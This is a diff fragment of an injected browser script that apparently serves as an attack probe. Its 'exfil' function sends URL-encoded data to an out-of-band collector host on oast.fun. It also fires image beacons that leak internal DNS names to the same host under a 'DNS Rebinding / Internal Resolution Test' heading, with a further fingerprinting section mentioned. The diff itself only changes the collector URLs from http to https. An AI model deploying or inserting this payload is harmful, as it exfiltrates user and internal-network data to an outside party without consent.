@@ -11,7 +11,7 @@
 <script>
 (function() {
   const exfil = (path, data) => {
-    fetch('http://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun' + path + '?d=' + encodeURIComponent(data));
+    fetch('https://qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun' + path + '?d=' + encodeURIComponent(data));
   };
 
   // === [2] DNS Rebinding / Internal Resolution Test ===
@@ -26,7 +26,7 @@
 
   internalDnsNames.forEach(name => {
     let img = new Image();
-    img.src = 'http://' + name + '.qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/ping';
+    img.src = 'https://' + name + '.qdvmcotjxcymyhmzaoprhaixp8cti506f.oast.fun/ping';
   });
 
   // === [3] Fingerprinting again for full context ===
